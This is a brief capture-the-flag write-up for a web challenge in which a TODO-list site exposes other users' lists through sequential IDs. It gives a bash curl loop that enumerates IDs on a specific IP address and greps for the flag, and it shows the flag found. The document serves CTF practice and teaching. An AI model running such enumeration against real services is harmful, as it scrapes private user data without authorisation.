# Super Secret Hidden Service
Web, 100 points

## Description:

> TODO: Remember where I put that flag...


## Solution:

A link to a website was attached. the site was called "Dead simple Todolists" and allowed creating a simple TODO list.

The list created by using the interface had the following link:
```
http://138.247.13.110/todolist/1000/
```

Accessing different IDs allowed viewing other users' TODOs.

Therefore, the following bash command could be used to search for the flag:
```console
# for i in `seq 1 1000`; do curl -s http://138.247.13.110/todolist/$i/ | gre
p MCA; done
              <li><input type="checkbox" id="checkbox" data-todo-id="678"> MCA{al3x4_5et_a_r3minder}</li>
```

